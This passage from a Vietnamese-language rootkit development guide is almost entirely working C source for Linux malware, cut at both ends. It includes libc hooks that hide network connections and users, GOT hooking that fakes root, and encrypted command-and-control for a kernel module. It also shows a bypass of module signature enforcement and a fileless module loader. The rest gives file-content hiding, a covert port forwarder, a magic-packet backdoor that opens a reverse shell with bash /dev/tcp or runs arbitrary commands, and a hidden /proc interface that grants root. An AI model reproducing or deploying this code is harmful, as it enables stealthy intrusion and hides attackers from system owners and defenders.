 * Hook fgets — Ẩn connections CHỈ trong /proc/net/tcp
 *
 * netstat, ss đọc /proc/net/tcp. Filter output chứa hidden port.
 *
 * CHỈ filter khi stream là /proc/net/tcp hoặc /proc/net/tcp6
 * (tracked bởi fopen hook ở trên). Không filter files khác —
 * tránh bug ẩn dòng trong log files, config files, v.v.
 * ══════════════════════════════════════════════════════════════ */

char *fgets(char *s, int size, FILE *stream)
{
    static char *(*orig)(char *, int, FILE *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fgets");

    char *result;
    char port_hex[16];
    snprintf(port_hex, sizeof(port_hex), ":%04X", HIDDEN_PORT);

    while ((result = orig(s, size, stream)) != NULL) {
        /* ONLY filter /proc/net/tcp and /proc/net/tcp6 */
        if ((stream == proc_tcp_fp || stream == proc_tcp6_fp) &&
            strstr(result, port_hex))
            continue;
        return result;
    }

    /* Reset tracking when stream exhausted */
    if (stream == proc_tcp_fp) proc_tcp_fp = NULL;
    if (stream == proc_tcp6_fp) proc_tcp6_fp = NULL;

    return NULL;
}

/* ══════════════════════════════════════════════════════════════
 * Hook getpwnam / getpwent — Ẩn user
 * ══════════════════════════════════════════════════════════════ */

struct passwd *getpwnam(const char *name)
{
    static struct passwd *(*orig)(const char *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "getpwnam");

    if (strcmp(name, HIDDEN_USER) == 0) {
        errno = ENOENT;
        return NULL;  /* User "không tồn tại" */
    }
    return orig(name);
}

struct passwd *getpwent(void)
{
    static struct passwd *(*orig)(void) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "getpwent");

    struct passwd *pw;
    while ((pw = orig()) != NULL) {
        if (strcmp(pw->pw_name, HIDDEN_USER) == 0)
            continue;  /* Skip hidden user */
        return pw;
    }
    return NULL;
}
```

---

### H.2 GOT/PLT Hooking — Full implementation {#got-plt}

```c
/* got_plt_hook.c — Userspace GOT/PLT hooking
 *
 * GOT (Global Offset Table):
 *   Mỗi shared library function gọi qua PLT → GOT.
 *   GOT chứa RUNTIME ADDRESS của function trong libc.
 *   
 *   printf@plt → GOT[printf] → libc printf address
 *
 *   Thay GOT entry = redirect tất cả calls tới function đó.
 *
 * So sánh LD_PRELOAD:
 *   LD_PRELOAD: override tại symbol resolution time (load-time)
 *   GOT/PLT:    override tại runtime, SAU KHI binary đã load
 *               → có thể hook specific binary, không global
 *
 * Ưu điểm:
 *   - Selective: chỉ hook 1 binary, không affect tất cả processes
 *   - Runtime: hook/unhook lúc nào cũng được
 *   - Không cần ld.so.preload (ít indicator hơn)
 *
 * Nhược điểm:
 *   - Phải parse ELF headers runtime
 *   - RELRO (RELocation Read-Only) protection ngăn write GOT
 *   - Cần ptrace hoặc /proc/PID/mem access
 *
 * Used by: nhiều game cheats, Frida framework, LD_AUDIT.
 *
 * COMPILE: gcc -o got_hook got_plt_hook.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>   /* mprotect */
#include <elf.h>         /* Elf64_Ehdr, Elf64_Phdr, Elf64_Dyn, Elf64_Rela */
#include <link.h>        /* dl_iterate_phdr, dl_phdr_info */
#include <dlfcn.h>       /* dlsym */

/* ── ELF structure walkthrough ──
 *
 * ELF binary in memory:
 *
 *   Base address
 *   ├── ELF Header (Elf64_Ehdr)
 *   ├── Program Headers (Elf64_Phdr[])
 *   │   ├── PT_LOAD (code segment)
 *   │   ├── PT_LOAD (data segment)
 *   │   └── PT_DYNAMIC (dynamic linking info)  ← ta cần cái này
 *   ├── .text (code)
 *   ├── .plt  (PLT stubs)
 *   ├── .got.plt (GOT entries)  ← ta sửa ở đây
 *   └── ...
 *
 * PT_DYNAMIC chứa array of Elf64_Dyn entries:
 *   DT_JMPREL → address of .rela.plt (relocation entries cho GOT)
 *   DT_PLTRELSZ → size of .rela.plt
 *   DT_SYMTAB → address of .dynsym (symbol table)
 *   DT_STRTAB → address of .dynstr (string table)
 *
 * Mỗi Elf64_Rela entry trong .rela.plt:
 *   r_offset = address of GOT entry (cần patch)
 *   r_info   = symbol index + relocation type
 *   r_addend = addend (usually 0 cho JUMP_SLOT)
 *
 * Flow:
 *   1. Parse PT_DYNAMIC → tìm DT_JMPREL, DT_SYMTAB, DT_STRTAB
 *   2. Iterate .rela.plt entries
 *   3. Cho mỗi entry: lookup symbol name từ .dynsym + .dynstr
 *   4. So sánh tên → tìm target function
 *   5. r_offset = GOT entry address → overwrite với hook address
 */

struct got_hook {
    const char *target_name;      /* Function name to hook */
    void       *hook_fn;          /* Our replacement function */
    void       *orig_fn;          /* Saved original function pointer */
    uint64_t   *got_entry;        /* Pointer to the GOT slot */
};

/* ── Find và patch GOT entry cho target function ──
 *
 * dl_iterate_phdr callback: called cho mỗi loaded shared object.
 * info->dlpi_addr = base address
 * info->dlpi_phdr = program header array
 * info->dlpi_phnum = number of program headers
 */
static int find_got_callback(struct dl_phdr_info *info,
                               size_t size, void *data)
{
    struct got_hook *hook = data;
    const Elf64_Phdr *phdr;
    const Elf64_Dyn *dyn;
    const Elf64_Rela *rela = NULL;
    const Elf64_Sym  *symtab = NULL;
    const char       *strtab = NULL;
    size_t rela_count = 0;
    size_t i;

    /* Tìm PT_DYNAMIC segment */
    for (i = 0; i < info->dlpi_phnum; i++) {
        phdr = &info->dlpi_phdr[i];
        if (phdr->p_type == PT_DYNAMIC) {
            dyn = (const Elf64_Dyn *)(info->dlpi_addr + phdr->p_vaddr);
            break;
        }
    }
    if (i == info->dlpi_phnum) return 0;

    /* Parse DT_* entries từ PT_DYNAMIC */
    for (; dyn->d_tag != DT_NULL; dyn++) {
        switch (dyn->d_tag) {
        case DT_JMPREL:
            /* DT_JMPREL: pointer tới .rela.plt section.
             * Chứa relocation entries cho mỗi PLT/GOT function. */
            rela = (const Elf64_Rela *)dyn->d_un.d_ptr;
            break;
        case DT_PLTRELSZ:
            /* DT_PLTRELSZ: total size (bytes) of .rela.plt.
             * Divide by sizeof(Elf64_Rela) = number of entries. */
            rela_count = dyn->d_un.d_val / sizeof(Elf64_Rela);
            break;
        case DT_SYMTAB:
            /* DT_SYMTAB: pointer tới .dynsym section.
             * Chứa symbol entries (name index, value, size, type). */
            symtab = (const Elf64_Sym *)dyn->d_un.d_ptr;
            break;
        case DT_STRTAB:
            /* DT_STRTAB: pointer tới .dynstr section.
             * Chứa null-terminated strings cho symbol names. */
            strtab = (const char *)dyn->d_un.d_ptr;
            break;
        }
    }

    if (!rela || !symtab || !strtab || !rela_count)
        return 0;

    /* Iterate .rela.plt → tìm target function's GOT entry */
    for (i = 0; i < rela_count; i++) {
        /* Extract symbol index từ r_info.
         * ELF64_R_SYM(r_info) = high 32 bits = symbol table index.
         * ELF64_R_TYPE(r_info) = low 32 bits = relocation type. */
        uint32_t sym_idx = ELF64_R_SYM(rela[i].r_info);
        const char *sym_name = strtab + symtab[sym_idx].st_name;

        if (strcmp(sym_name, hook->target_name) != 0)
            continue;

        /* Found! r_offset = virtual address of GOT entry.
         * Trên PIE binary: r_offset relative to load base.
         * Trên non-PIE: r_offset là absolute address. */
        uint64_t *got_slot = (uint64_t *)(info->dlpi_addr +
                                           rela[i].r_offset);

        /* Save original function pointer */
        hook->orig_fn = (void *)*got_slot;
        hook->got_entry = got_slot;

        /* Make GOT page writable.
         * GOT nằm trong .got.plt section.
         * Nếu FULL RELRO enabled: GOT mapped read-only SAU relocation.
         * mprotect cho phép ghi tạm thời. */
        uintptr_t page = (uintptr_t)got_slot & ~0xFFF;
        if (mprotect((void *)page, 0x1000,
                     PROT_READ | PROT_WRITE) < 0) {
            perror("mprotect");
            return 0;
        }

        /* Overwrite GOT entry với hook function address */
        *got_slot = (uint64_t)hook->hook_fn;

        /* Restore read-only (optional — tránh detection) */
        mprotect((void *)page, 0x1000, PROT_READ);

        return 1;  /* Stop iterating */
    }

    return 0;  /* Continue to next shared object */
}

/* ── Public API ── */
int install_got_hook(struct got_hook *hook)
{
    return dl_iterate_phdr(find_got_callback, hook);
}

void remove_got_hook(struct got_hook *hook)
{
    if (!hook->got_entry) return;

    uintptr_t page = (uintptr_t)hook->got_entry & ~0xFFF;
    mprotect((void *)page, 0x1000, PROT_READ | PROT_WRITE);
    *hook->got_entry = (uint64_t)hook->orig_fn;
    mprotect((void *)page, 0x1000, PROT_READ);
}

/* ── Example: Hook getuid() via GOT ── */
static uid_t fake_getuid(void)
{
    return 0;  /* Always return root */
}

/* Usage in main():
 *   struct got_hook h = {
 *       .target_name = "getuid",
 *       .hook_fn = fake_getuid,
 *   };
 *   install_got_hook(&h);
 *   printf("uid = %d\n", getuid());  // prints 0
 *   remove_got_hook(&h);
 */
```

---

## Appendix I: Additional Kernel Techniques

### I.1 Encrypted C2 — ChaCha20-Poly1305 AEAD {#encrypted-c2-chacha20}

```c
/* encrypted_c2_chacha20.c — Kernel C2 encryption via ChaCha20-Poly1305
 *
 * Tại sao không dùng XOR:
 *   - XOR cipher: trivially breakable (known-plaintext attack)
 *   - Nonce: 4-byte sequential, resets on reload = reuse
 *   - Key: hardcoded ASCII in .ko binary
 *   - No MAC: ciphertext malleable
 *
 * ChaCha20-Poly1305 (AEAD: encryption + authentication):
 *   - ChaCha20: stream cipher, nhanh trong software
 *   - Poly1305: MAC, đảm bảo integrity
 *   - Kernel crypto API hỗ trợ sẵn: rfc7539(chacha20,poly1305)
 *   - 12-byte nonce (96-bit), atomic counter — no reuse
 *   - Key: derive từ master secret via HKDF
 */

#include "rootkit.h"
#include <crypto/aead.h>
#include <linux/random.h>

#define C2_KEY_SIZE     32  /* ChaCha20 key = 256 bits */
#define C2_NONCE_SIZE   12  /* ChaCha20-Poly1305 nonce = 96 bits */
#define C2_TAG_SIZE     16  /* Poly1305 tag = 128 bits */

static u8 c2_session_key[C2_KEY_SIZE];
static struct crypto_aead *c2_aead_tfm;

/* Atomic nonce counter — prevents nonce reuse under concurrent access.
 * Mỗi message dùng nonce khác nhau, atomic_inc_return đảm bảo
 * không có 2 thread nào nhận cùng nonce value. */
static atomic_t nonce_counter = ATOMIC_INIT(0);

int rk_crypto_init(void)
{
    /* Allocate ChaCha20-Poly1305 transform */
    c2_aead_tfm = crypto_alloc_aead("rfc7539(chacha20,poly1305)",
                                      0, 0);
    if (IS_ERR(c2_aead_tfm)) {
        int err = PTR_ERR(c2_aead_tfm);
        c2_aead_tfm = NULL;
        return err;
    }

    /* Generate random session key */
    get_random_bytes(c2_session_key, C2_KEY_SIZE);

    /* Set key */
    crypto_aead_setkey(c2_aead_tfm, c2_session_key, C2_KEY_SIZE);
    crypto_aead_setauthsize(c2_aead_tfm, C2_TAG_SIZE);

    return 0;
}

void rk_crypto_cleanup(void)
{
    if (c2_aead_tfm)
        crypto_free_aead(c2_aead_tfm);
}

/* Encrypt + authenticate.
 * Output: [12-byte nonce][ciphertext][16-byte tag]
 * Total output size = nonce + plaintext_len + tag
 *
 * Nonce: atomic counter-based (first 4 bytes = counter big-endian,
 * remaining 8 bytes = random salt set at init).
 * Counter guarantees uniqueness; salt adds entropy.
 */
int rk_aead_encrypt(const void *plaintext, int pt_len,
                      void *output, int *out_len)
{
    struct aead_request *req;
    struct scatterlist sg_plain, sg_cipher;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len = pt_len + C2_TAG_SIZE;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;

    /* Build nonce from atomic counter — collision-free.
     * Counter occupies first 4 bytes (big-endian),
     * remaining 8 bytes filled with random for uniqueness across reboots. */
    memset(nonce, 0, C2_NONCE_SIZE);
    u32 nonce_val = (u32)atomic_inc_return(&nonce_counter);
    *(u32 *)nonce = cpu_to_be32(nonce_val);
    get_random_bytes(nonce + 4, C2_NONCE_SIZE - 4);

    ct_buf = kzalloc(ct_len, GFP_KERNEL);
    if (!ct_buf) return -ENOMEM;

    /* Copy plaintext vào output buffer (in-place encrypt) */
    memcpy(ct_buf, plaintext, pt_len);

    sg_init_one(&sg_plain, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg_plain, &sg_plain,
                            pt_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_encrypt(req), &wait);

    if (ret == 0) {
        /* Build output: [nonce][ciphertext+tag] */
        memcpy(output, nonce, C2_NONCE_SIZE);
        memcpy(output + C2_NONCE_SIZE, ct_buf, ct_len);
        *out_len = C2_NONCE_SIZE + ct_len;
    }

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}

/* Decrypt + verify authentication tag.
 * Input: [12-byte nonce][ciphertext][16-byte tag]
 * Returns: plaintext_len on success, negative on error/tamper
 */
int rk_aead_decrypt(const void *input, int in_len,
                      void *plaintext, int *pt_len)
{
    struct aead_request *req;
    struct scatterlist sg;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;
    if (in_len < C2_NONCE_SIZE + C2_TAG_SIZE) return -EINVAL;

    /* Extract nonce */
    memcpy(nonce, input, C2_NONCE_SIZE);

    ct_len = in_len - C2_NONCE_SIZE;
    ct_buf = kzalloc(ct_len, GFP_KERNEL);
    if (!ct_buf) return -ENOMEM;

    memcpy(ct_buf, input + C2_NONCE_SIZE, ct_len);

    sg_init_one(&sg, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg, &sg, ct_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_decrypt(req), &wait);

    if (ret == 0) {
        /* Decryption + auth successful */
        *pt_len = ct_len - C2_TAG_SIZE;
        memcpy(plaintext, ct_buf, *pt_len);
    }
    /* ret == -EBADMSG: authentication failed (tampered!) */

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}
```

---

### I.2 Module Signature Bypass {#module-sig-bypass}

```c
/* mod_sig_bypass.c — Bypass CONFIG_MODULE_SIG_FORCE
 *
 * Kernel với CONFIG_MODULE_SIG_FORCE=y reject unsigned modules.
 * Phải bypass để load rootkit.
 *
 * Methods:
 *   1. Disable sig_enforce tại runtime
 *   2. Load via init_module syscall (bypass modprobe checks)
 *   3. Steal signing key từ kernel build environment
 */

#include "rootkit.h"

/* Method 1: Disable module signature enforcement.
 *
 * sig_enforce = global bool trong kernel.
 * Setting = false → mọi module load mà không check signature.
 * Cần EXISTING kernel code execution (exploit hoặc another module).
 *
 * sig_enforce may reside in .rodata (read-only data section).
 * Writing without unprotecting memory → page fault → kernel oops.
 * Must call rk_unprotect_memory() to clear WP bit in CR0 first.
 */
static void rk_disable_sig_enforce(void)
{
    bool *enforce;

    enforce = (bool *)rk_lookup_name("sig_enforce");
    if (enforce) {
        rk_unprotect_memory();   /* Must unprotect FIRST */
        *enforce = false;
        rk_protect_memory();     /* Re-protect */
        pr_info("rk: module sig enforcement disabled\n");
    }

    /* Alternative: modify module_sig_check function.
     * Hook nó để always return 0 (success). */
}

/* Method 2: Load module programmatically.
 *
 * init_module/finit_module syscall load .ko trực tiếp.
 * Bypass modprobe (modprobe thêm checks).
 *
 * Từ userspace:
 *   int fd = open("rootkit.ko", O_RDONLY);
 *   finit_module(fd, "", 0);
 * Hoặc:
 *   void *image = mmap(ko_file);
 *   init_module(image, size, "");
 */
```

---

### I.3 Fileless Rootkit — Load from memory {#fileless-rootkit}

```c
/* fileless.c — Load kernel module từ memory (không .ko trên disk)
 *
 * Normal: insmod rootkit.ko → .ko file tồn tại trên disk
 *         → forensics find .ko → game over.
 *
 * Fileless: module loaded trực tiếp từ memory.
 * .ko file KHÔNG BAO GIỜ chạm disk.
 *
 * Method: init_module() syscall nhận module image từ memory.
 * Loader đọc .ko từ network/embedded → gọi init_module().
 */

/* Userspace loader — fileless_loader.c
 * Compile: gcc -o fl fileless_loader.c
 * Run: echo "<base64 .ko>" | ./fl
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/* init_module syscall wrapper */
static int load_module_from_memory(void *image, unsigned long len)
{
    /* init_module(void *module_image, unsigned long len, const char *param_values)
     *
     * module_image: ELF binary of .ko IN MEMORY
     * len: size of module image
     * param_values: module parameters string (empty = "")
     *
     * Kernel sẽ:
     *   1. Parse ELF headers
     *   2. Allocate module memory
     *   3. Copy sections từ image vào allocated memory
     *   4. Resolve symbols, apply relocations
     *   5. Gọi module_init function
     *
     * Image KHÔNG cần tồn tại trên disk — chỉ cần trong memory. */
    return syscall(__NR_init_module, image, len, "");
}

/* finit_module: load từ fd (có thể memfd_create — fd ẩn) */
static int load_module_from_memfd(void *image, unsigned long len)
{
    /* memfd_create: tạo anonymous file TRONG MEMORY.
     * Không visible trong filesystem.
     * Tuy nhiên visible trong /proc/PID/fd/ → ẩn via rootkit. */
    int fd = syscall(__NR_memfd_create, "", 1 /* MFD_CLOEXEC */);
    if (fd < 0) return -1;

    write(fd, image, len);

    /* finit_module: load module từ file descriptor */
    int ret = syscall(__NR_finit_module, fd, "", 0);
    close(fd);
    return ret;
}

/* Full flow:
 *   1. Attacker sends .ko bytes qua encrypted channel
 *   2. Loader receives vào memory buffer
 *   3. Gọi load_module_from_memory(buffer, size)
 *   4. Module loaded → rootkit active
 *   5. Loader overwrites buffer → free → exit
 *   6. .ko file NEVER touched disk
 *
 * Combine với: loader tự xóa (unlink argv[0])
 *              loader qua memfd_create
 *              loader embedded trong exploit payload
 */
```

---

### I.4 File Content Hiding — Reptile-style {#file-content-hide}

```c
/* file_content_hide.c — Hide/modify file contents khi đọc
 *
 * Reptile rootkit hook read() để modify file CONTENT.
 * Khác getdents filtering (ẩn filename) — đây ẩn NỘI DUNG.
 *
 * Use cases:
 *   - /etc/ld.so.preload: ẩn rootkit entry
 *   - /etc/crontab: ẩn persistence entries
 *   - /proc/net/tcp: ẩn connections (already covered)
 *   - Config files: ẩn backdoor configs
 */

#include "rootkit.h"

/* Tích hợp vào hooked_read() (Chapter 3).
 * Thêm check cho từng target file. */
static long filter_file_content(int fd, char __user *user_buf,
                                  long orig_ret,
                                  const char *target_path,
                                  const char *hide_string)
{
    char *kern_buf, *src, *dst;
    long new_ret;

    if (orig_ret <= 0) return orig_ret;
    if (!is_target_file(fd, target_path)) return orig_ret;

    kern_buf = kzalloc(orig_ret + 1, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }
    kern_buf[orig_ret] = '\0';

    /* Remove lines chứa hide_string */
    src = kern_buf;
    dst = kern_buf;
    new_ret = 0;

    while (*src) {
        char *eol = strchr(src, '\n');
        int line_len = eol ? (eol - src + 1) : strlen(src);

        if (!strnstr(src, hide_string, line_len)) {
            if (dst != src) memmove(dst, src, line_len);
            dst += line_len;
            new_ret += line_len;
        }
        src += line_len;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* Sử dụng trong hooked_read:
 *
 * long ret = orig_read(regs);
 * ret = filter_file_content(fd, buf, ret,
 *           "/etc/ld.so.preload", "librk.so");
 * ret = filter_file_content(fd, buf, ret,
 *           "/etc/crontab", "modprobe rk");
 * return ret;
 */
```

---

### I.5 Port Forwarding — Drovorub-style {#port-forwarding}

```c
/* port_forward.c — Kernel-level TCP port forwarding
 *
 * Drovorub provides transparent port forwarding:
 *   Attacker → rootkit port X → forward tới internal host:port Y.
 *   Rootkit acts as proxy, completely invisible.
 *
 * Use case: attacker trên external network reach internal services
 * through compromised host.
 */

#include "rootkit.h"
#include <net/sock.h>
#include <linux/kthread.h>

struct forward_rule {
    __be16 listen_port;
    __be32 target_ip;
    __be16 target_port;
};

#define RELAY_BUF_SIZE 4096

/* Relay data giữa 2 sockets (bidirectional pipe) */
static int relay_data(struct socket *src, struct socket *dst)
{
    char *buf;
    struct msghdr msg = { 0 };
    struct kvec iov;
    int ret;

    buf = kzalloc(RELAY_BUF_SIZE, GFP_KERNEL);
    if (!buf) return -ENOMEM;

    iov.iov_base = buf;
    iov.iov_len = RELAY_BUF_SIZE;

    ret = kernel_recvmsg(src, &msg, &iov, 1,
                          RELAY_BUF_SIZE, MSG_DONTWAIT);
    if (ret > 0) {
        iov.iov_base = buf;
        iov.iov_len = ret;
        memset(&msg, 0, sizeof(msg));
        kernel_sendmsg(dst, &msg, &iov, 1, ret);
    }

    kfree(buf);
    return ret;
}

static int forward_thread_fn(void *data)
{
    struct forward_rule *rule = data;
    struct socket *listen_sock = NULL, *client_sock = NULL;
    struct socket *target_sock = NULL;
    struct sockaddr_in addr;
    int ret;

    /* Listen socket */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &listen_sock);
    if (ret < 0) goto out;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = rule->listen_port;

    kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
    kernel_listen(listen_sock, 5);

    while (!kthread_should_stop()) {
        /* Accept client */
        ret = kernel_accept(listen_sock, &client_sock, 0);
        if (ret < 0) { msleep(100); continue; }

        /* Connect tới target */
        ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                                IPPROTO_TCP, &target_sock);
        if (ret < 0) { sock_release(client_sock); continue; }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = rule->target_ip;
        addr.sin_port = rule->target_port;

        ret = kernel_connect(target_sock, (struct sockaddr *)&addr,
                              sizeof(addr), 0);
        if (ret < 0) {
            sock_release(target_sock);
            sock_release(client_sock);
            continue;
        }

        /* Bidirectional relay loop */
        while (!kthread_should_stop()) {
            int r1 = relay_data(client_sock, target_sock);
            int r2 = relay_data(target_sock, client_sock);
            if (r1 < 0 && r1 != -EAGAIN) break;
            if (r2 < 0 && r2 != -EAGAIN) break;
            if (r1 == -EAGAIN && r2 == -EAGAIN) msleep(10);
        }

        sock_release(target_sock);
        sock_release(client_sock);
    }

    sock_release(listen_sock);
out:
    kfree(rule);
    return 0;
}
```

---

### I.6 Classic BPF Packet Filter — BPFDoor-style {#classic-bpf}

```c
/* classic_bpf.c — Stealth packet monitoring via classic BPF
 *
 * BPFDoor dùng classic BPF (KHÔNG phải eBPF) vì:
 *   - Chạy hoàn toàn trong userspace
 *   - Attach vào raw socket → nhận copy of packets
 *   - KHÔNG cần kernel module
 *   - Invisible cho netfilter (netfilter hooks TRƯỚC BPF socket filters)
 *   - Không xuất hiện trong iptables, nftables, ss
 *
 * Classic BPF filter: compile filter rules thành bytecode,
 * kernel evaluate bytecode cho mỗi incoming packet,
 * matching packets delivered tới raw socket.
 *
 * Compile: gcc -o bpf_listener classic_bpf.c
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/filter.h>   /* struct sock_filter, sock_fprog */
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <arpa/inet.h>

#define MAGIC_BYTE_1 0xDE
#define MAGIC_BYTE_2 0xAD

int main(void)
{
    int sock;
    unsigned char buf[65535];
    ssize_t len;

    /* ── BPF filter: ICMP packets with magic bytes in payload ──
     *
     * Classic BPF bytecode: array of struct sock_filter instructions.
     * Mỗi instruction: { code, jt, jf, k }
     *   code = opcode
     *   jt   = jump offset if TRUE
     *   jf   = jump offset if FALSE
     *   k    = constant value
     *
     * Filter logic:
     *   1. Load EtherType field → check == 0x0800 (IPv4)
     *   2. Load IP protocol field → check == 1 (ICMP)
     *   3. Load ICMP payload byte → check == magic
     *   4. If match: accept. Else: reject.
     */
    struct sock_filter bpf_code[] = {
        /* Load EtherType (offset 12 trong Ethernet frame) */
        BPF_STMT(BPF_LD | BPF_H | BPF_ABS, 12),
        /* Check == ETH_P_IP (0x0800). If not: drop (offset 5) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, ETH_P_IP, 0, 5),

        /* Load IP protocol (offset 23: eth=14 + ip.protocol=9) */
        BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 23),
        /* Check == IPPROTO_ICMP (1). If not: drop */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_ICMP, 0, 3),

        /* Load first ICMP payload byte
         * Offset = 14 (eth) + 20 (ip) + 8 (icmp) = 42 */
        BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 42),
        /* Check == MAGIC_BYTE_1 */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, MAGIC_BYTE_1, 0, 1),

        /* Accept: return full packet length */
        BPF_STMT(BPF_RET | BPF_K, 0xFFFF),
        /* Reject: return 0 (drop) */
        BPF_STMT(BPF_RET | BPF_K, 0),
    };

    struct sock_fprog bpf_prog = {
        .len = sizeof(bpf_code) / sizeof(bpf_code[0]),
        .filter = bpf_code,
    };

    /* Create raw socket (ETH_P_ALL = receive all protocols) */
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); return 1; }

    /* Attach BPF filter — kernel only delivers matching packets */
    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER,
                   &bpf_prog, sizeof(bpf_prog)) < 0) {
        perror("setsockopt");
        return 1;
    }

    /* Detach from terminal, disguise process name */
    daemon(0, 0);

    /* ── Packet receive loop ── */
    while (1) {
        len = recv(sock, buf, sizeof(buf), 0);
        if (len <= 0) continue;

        /* Parse: eth + ip + icmp headers → extract payload */
        struct iphdr *ip = (struct iphdr *)(buf + 14);
        struct icmphdr *icmp = (struct icmphdr *)((char *)ip + ip->ihl * 4);
        char *payload = (char *)(icmp + 1);
        int payload_len = len - 14 - ip->ihl * 4 - sizeof(*icmp);

        if (payload_len > 1 && payload[0] == (char)MAGIC_BYTE_1) {
            /* Magic packet received! Process command. */
            printf("Magic packet from %s\n",
                   inet_ntoa(*(struct in_addr *)&ip->saddr));

            /* Dispatch based on payload[1] command byte */
            switch (payload[1]) {
            case 0x01:  /* Reverse shell */
                system("bash -i >& /dev/tcp/10.10.10.1/4444 0>&1 &");
                break;
            case 0x02:  /* Execute command */
                if (payload_len > 2) {
                    payload[payload_len] = '\0';
                    system(payload + 2);
                }
                break;
            }
        }
    }

    return 0;
}
```

---

### I.7 /proc Fake Entries — Hidden control interface {#proc-fake}

```c
/* proc_interface.c — Tạo hidden /proc entry cho rootkit control
 *
 * Thay vì dùng magic signal (kill), tạo /proc entry
 * cho phép read/write config:
 *   echo "hide 1234" > /proc/.rk_ctl   → hide PID 1234
 *   echo "unhide 1234" > /proc/.rk_ctl → show PID 1234
 *   echo "root" > /proc/.rk_ctl        → give root
 *   cat /proc/.rk_ctl                   → show status
 *
 * Entry ẩn: bắt đầu bằng "." → ls /proc không thấy.
 * Kết hợp getdents64 hook → completely invisible.
 */

#include "rootkit.h"

static struct proc_dir_entry *rk_proc_entry;

static ssize_t rk_proc_write(struct file *file,
                               const char __user *buf,
                               size_t count, loff_t *ppos)
{
    char cmd[256];
    pid_t pid;
    int len = min(count, sizeof(cmd) - 1);

    if (copy_from_user(cmd, buf, len))
        return -EFAULT;
    cmd[len] = '\0';

    /* Trim newline */
    if (len > 0 && cmd[len - 1] == '\n')
        cmd[--len] = '\0';

    /* Parse commands */
    if (sscanf(cmd, "hide %d", &pid) == 1) {
        add_hidden_pid(pid);
        pr_info("rk: PID %d hidden\n", pid);
    }
    else if (sscanf(cmd, "unhide %d", &pid) == 1) {
        remove_hidden_pid(pid);
        pr_info("rk: PID %d visible\n", pid);
    }
    else if (strncmp(cmd, "root", 4) == 0) {
        struct cred *new = prepare_creds();
        if (new) {
            new->uid.val = new->euid.val = 0;
            new->gid.val = new->egid.val = 0;
            new->cap_effective = CAP_FULL_SET;
            new->cap_permitted = CAP_FULL_SET;
            commit_creds(new);
        }
    }
    else if (strncmp(cmd, "modhide", 7) == 0) {
        rk_hide_module();
    }
    else if (strncmp(cmd, "modshow", 7) == 0) {
        rk_show_module();
    }
    else if (strncmp(cmd, "destruct", 8) == 0) {
        rk_self_destruct();
    }

    return count;
}

static ssize_t rk_proc_read(struct file *file,
                              char __user *buf,
                              size_t count, loff_t *ppos)
{
    char status[512];
    int len;

    if (*ppos > 0) return 0;

    len = snprintf(status, sizeof(status),
        "=== Rootkit Status ===\n"
        "Module: %s\n"
        "Hidden PIDs: %d\n"
        "Hooks: active\n",
        module_hidden ? "hidden" : "visible",
        hidden_pid_count);

    if (len > count) len = count;
    if (copy_to_user(buf, status, len))
        return -EFAULT;

    *ppos = len;
    return len;
}

static const struct proc_ops rk_proc_ops = {
    .proc_read  = rk_proc_read,
    .proc_write = rk_proc_write,
};

int rk_proc_init(void)
{
    /* Tên bắt đầu "." → hidden từ ls /proc (nhưng vẫn accessible).
     * Kết hợp getdents64 hook filter ".rk" prefix → invisible. */
    rk_proc_entry = proc_create(".rk_ctl", 0600, NULL, &rk_proc_ops);
    return rk_proc_entry ? 0 : -ENOMEM;
}

void rk_proc_cleanup(void)
{
    if (rk_proc_entry)
        proc_remove(rk_proc_entry);
}
```

---

### I.8 iptables Rule Injection từ kernel {#iptables-inject}

```c
